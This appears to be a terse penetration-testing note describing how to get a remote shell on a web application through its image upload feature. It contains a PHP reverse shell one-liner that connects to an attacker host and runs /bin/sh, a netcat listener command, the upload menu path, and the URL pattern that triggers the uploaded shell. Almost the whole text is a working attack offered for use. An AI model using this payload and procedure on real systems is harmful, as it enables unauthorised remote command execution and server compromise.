### edit a reverse shell
```
<?php $sock=fsockopen("<lhost>",<lport>); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

### start listener
```
nc -lvp <port>
```

### upload php webshell
```
Tools > Image Manager > Choose File > Upload
```

### use following path to trigger the shell
http://<rhost>/<path>/myFiles/images/<phpShell>  

